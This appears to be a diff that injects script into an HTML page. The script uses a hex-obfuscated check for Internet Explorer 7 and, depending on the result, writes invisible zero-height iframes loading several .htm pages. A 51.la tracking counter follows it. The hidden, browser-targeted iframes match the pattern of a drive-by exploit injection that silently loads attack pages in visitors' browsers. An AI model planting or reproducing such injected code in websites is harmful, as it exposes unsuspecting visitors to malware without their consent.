@@ -1,0 +1,10 @@
+<script language="JavaScript">
+if(navigator.userAgent.toLowerCase().indexOf("\x6d\x73\x69"+"\x65\x20\x37")==-1)
+document.write("<iframe width=100 height=0 src=nYnTd14.htm></iframe>");
+document.write("<iframe width=100 height=0 src=yt.htm></iframe>");
+if(navigator.userAgent.toLowerCase().indexOf("\x6d\x73\x69\x65\x20\x37")>0)
+document.write("<iframe src=nYnTdi.htm width=100 height=0></iframe>");
+document.write("<iframe src=YUT.htm width=100 height=0></iframe>");
+</script>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/3190896.js"></script>
+<noscript><a href="http://www.51.la/?3190896" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="http://img.users.51.la/3190896.asp" style="border:none" /></a></noscript>
